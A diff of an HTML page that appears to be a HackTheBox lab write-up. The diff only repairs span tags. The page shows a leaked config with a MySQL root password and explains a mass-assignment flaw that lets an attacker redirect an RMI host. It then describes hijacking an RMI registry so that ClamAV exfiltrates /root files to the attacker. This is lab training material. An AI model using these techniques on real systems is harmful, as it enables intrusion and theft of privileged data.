@@ -438,14 +438,14 @@ x etc/hosting.ini
 
 <span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">etc/hosting.ini</span>
 </code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#Mon Jan 30 21:05:01 GMT 2023</span>
-<span class="mtk5">mysql.password<span>=<span class="mtk4">O8lBvQUBPU4CMbvJmYqY</span>
-<span class="mtk5">rmi.host<span>=<span class="mtk4">registry.webhosting.htb</span>
-<span class="mtk5">mysql.user<span>=<span class="mtk4">root</span>
-<span class="mtk5">mysql.port<span>=<span class="mtk4">3306</span>
-<span class="mtk5">mysql.host<span>=<span class="mtk4">localhost</span>
-<span class="mtk5">domains.start-template<span>=<span class="mtk4">&lt;body&gt;\r\n&lt;h1&gt;It works\!&lt;/h1&gt;\r\n&lt;/body&gt;</span>  
-<span class="mtk5">domains.max<span>=<span class="mtk4">5</span>
-<span class="mtk5">rmi.port<span>=<span class="mtk4">9002</span>
+<span class="mtk5">mysql.password</span>=<span class="mtk4">O8lBvQUBPU4CMbvJmYqY</span>
+<span class="mtk5">rmi.host</span>=<span class="mtk4">registry.webhosting.htb</span>
+<span class="mtk5">mysql.user</span>=<span class="mtk4">root</span>
+<span class="mtk5">mysql.port</span>=<span class="mtk4">3306</span>
+<span class="mtk5">mysql.host</span>=<span class="mtk4">localhost</span>
+<span class="mtk5">domains.start-template</span>=<span class="mtk4">&lt;body&gt;\r\n&lt;h1&gt;It works\!&lt;/h1&gt;\r\n&lt;/body&gt;</span>  
+<span class="mtk5">domains.max</span>=<span class="mtk4">5</span>
+<span class="mtk5">rmi.port</span>=<span class="mtk4">9002</span>
 </code></pre></div><p>Well, it contains sensitive information, but it is useless for the moment.</p><h3 id="war-decompilation">WAR decompilation</h3><p>There is another blob that contains the WAR file that is running on the server:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">tar</span> xvfz <span class="mtku">sha256:396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7.tar.gz</span>  
 x usr/
 x usr/local/
@@ -835,14 +835,14 @@ META-INF
 <span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">File</span><span class="mtk1"> </span><span class="mtk1">SETTINGS_FILE</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">File</span><span class="mtk1">(</span><span class="mtk4">"/etc/hosting.ini"</span><span class="mtk1">);</span>
 <span class="mtk1">}</span>
 </code></pre></div><p>Let&rsquo;s recall the contents of <code>/etc/hosting.ini</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#Mon Jan 30 21:05:01 GMT 2023</span>
-<span class="mtk5">mysql.password<span>=<span class="mtk4">O8lBvQUBPU4CMbvJmYqY</span>
-<span class="mtk5">rmi.host<span>=<span class="mtk4">registry.webhosting.htb</span>
-<span class="mtk5">mysql.user<span>=<span class="mtk4">root</span>
-<span class="mtk5">mysql.port<span>=<span class="mtk4">3306</span>
-<span class="mtk5">mysql.host<span>=<span class="mtk4">localhost</span>
-<span class="mtk5">domains.start-template<span>=<span class="mtk4">&lt;body&gt;\r\n&lt;h1&gt;It works\!&lt;/h1&gt;\r\n&lt;/body&gt;</span>  
-<span class="mtk5">domains.max<span>=<span class="mtk4">5</span>
-<span class="mtk5">rmi.port<span>=<span class="mtk4">9002</span>
+<span class="mtk5">mysql.password</span>=<span class="mtk4">O8lBvQUBPU4CMbvJmYqY</span>
+<span class="mtk5">rmi.host</span>=<span class="mtk4">registry.webhosting.htb</span>
+<span class="mtk5">mysql.user</span>=<span class="mtk4">root</span>
+<span class="mtk5">mysql.port</span>=<span class="mtk4">3306</span>
+<span class="mtk5">mysql.host</span>=<span class="mtk4">localhost</span>
+<span class="mtk5">domains.start-template</span>=<span class="mtk4">&lt;body&gt;\r\n&lt;h1&gt;It works\!&lt;/h1&gt;\r\n&lt;/body&gt;</span>  
+<span class="mtk5">domains.max</span>=<span class="mtk4">5</span>
+<span class="mtk5">rmi.port</span>=<span class="mtk4">9002</span>
 </code></pre></div><p>Although the front-end page (JSP) only allows to change <code>domains.start-template</code> and <code>domains.max</code>, the <em>servlet</em> does not check these parameters. Therefore, we have a mass assignment vulnerability here, because we can modify any of the above configurations. The one that looks promising is the <code>rmi.host</code>, because we can point it to our attacker machine and tell the RMI client to execute a (malicious) method defined by us.</p><p>This is the code for the <code>RMIClientWrapper</code> class:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">/*</span>
 <span class="mtk3"> * Decompiled with CFR 0.150.</span>
 <span class="mtk3"> * </span>
@@ -976,14 +976,14 @@ Warning: Unable to load '/usr/share/zoneinfo/zone1970.tab' as time zone. Skippin
 [System] [MY-011323] [Server] X Plugin ready for connections. Bind-address: '::' port: 33060, socket: /var/run/mysqld/mysqlx.sock
 [System] [MY-010931] [Server] /usr/sbin/mysqld: ready for connections. Version: '8.0.34'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  MySQL Community Server - GPL.
 </code></pre></div><p>Now, to run the WAR file, we will use another Docker container with a Tomcat (9.0.2) image. We also need to enter the <code>hosting.ini</code> file (a bit different because of the MySQL connection) and set <code>registry.webhosting.htb</code> in <code>/etc/hosts</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#Mon Jan 30 21:05:01 GMT 2023</span>
-<span class="mtk5">mysql.password<span>=<span class="mtk4">O8lBvQUBPU4CMbvJmYqY</span>
-<span class="mtk5">rmi.host<span>=<span class="mtk4">registry.webhosting.htb</span>
-<span class="mtk5">mysql.user<span>=<span class="mtk4">root</span>
-<span class="mtk5">mysql.port<span>=<span class="mtk4">3306</span>
-<span class="mtk5">mysql.host<span>=<span class="mtk4">192.168.1.132</span>
-<span class="mtk5">domains.start-template<span>=<span class="mtk4">&lt;body&gt;\r\n&lt;h1&gt;It works\!&lt;/h1&gt;\r\n&lt;/body&gt;</span>  
-<span class="mtk5">domains.max<span>=<span class="mtk4">5</span>
-<span class="mtk5">rmi.port<span>=<span class="mtk4">9002</span>
+<span class="mtk5">mysql.password</span>=<span class="mtk4">O8lBvQUBPU4CMbvJmYqY</span>
+<span class="mtk5">rmi.host</span>=<span class="mtk4">registry.webhosting.htb</span>
+<span class="mtk5">mysql.user</span>=<span class="mtk4">root</span>
+<span class="mtk5">mysql.port</span>=<span class="mtk4">3306</span>
+<span class="mtk5">mysql.host</span>=<span class="mtk4">192.168.1.132</span>
+<span class="mtk5">domains.start-template</span>=<span class="mtk4">&lt;body&gt;\r\n&lt;h1&gt;It works\!&lt;/h1&gt;\r\n&lt;/body&gt;</span>  
+<span class="mtk5">domains.max</span>=<span class="mtk4">5</span>
+<span class="mtk5">rmi.port</span>=<span class="mtk4">9002</span>
 </code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run -it --rm -v <span class="code-dark-yellow">"<span class="code-dark-cyan">$PWD</span>:/home/rocky"</span> -p 8080:8080 tomcat:9.0.2 bash
 root@a4c9f6e5a3b4:/usr/local/tomcat# cp /home/rocky/hosting.ini /etc
 root@a4c9f6e5a3b4:/usr/local/tomcat# cp /home/rocky/hosting.war webapps
@@ -1640,7 +1640,7 @@ developer@10.10.11.223's password:
 <span class="code-blue">CMD: UID=0    PID=24016  | /lib/systemd/systemd-udevd</span>
 <span class="code-red">CMD: UID=999  PID=24015  | /usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar /opt/registry.jar</span>
 <span class="code-blue">CMD: UID=0    PID=24031  |</span>
-<span class="code-blue">CMD: UID=0    PID=24032  | /lib/systemd/systemd-udevd
+<span class="code-blue">CMD: UID=0    PID=24032  | /lib/systemd/systemd-udevd</span>
 </code></pre></div><p>Here we have a small time window to execute our malicious RMI registry on port 9002, so that the legitimate <code>registry.jar</code> is no longer able to listen on that port. As a result, <code>quarantine.jar</code> will connect to our RMI registry and we will be able to set an arbitrary configuration for ClamAV.</p><p>For instance, what we will do is actually set the ClamAV host to our attacker machine IP address, the quarantine directory to <code>/dev/shm</code> (which is accessible by everyone) and the directory to scan will be <code>/root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">quarantine</span><span class="mtk1">;</span>
 
 <span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">io</span><span class="mtk5">.</span><span class="mtk8 mtku">File</span><span class="mtk1">;</span>
